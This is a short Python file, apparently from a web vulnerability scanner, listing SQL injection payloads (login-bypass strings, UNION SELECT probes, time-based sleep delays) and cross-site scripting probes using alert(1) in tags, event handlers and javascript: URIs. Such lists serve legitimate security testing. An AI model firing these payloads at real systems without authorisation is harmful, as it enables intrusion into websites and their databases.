# Vulnerability payloads list

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 1=1 #",
    "\" OR 1=1 #",
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "'; WAITFOR DELAY '0:0:5' --",
    "'; SELECT PG_SLEEP(5) --",
    "'; SLEEP(5) --"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\\\"><script>alert(1)</script>",
    "\\\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "';alert(1)//",
    "\\\";alert(1)//",
    "<iframe src=\"javascript:alert(1)\">",
    "<details open onerror=alert(1)>",
    "<body onload=alert(1)>"
]
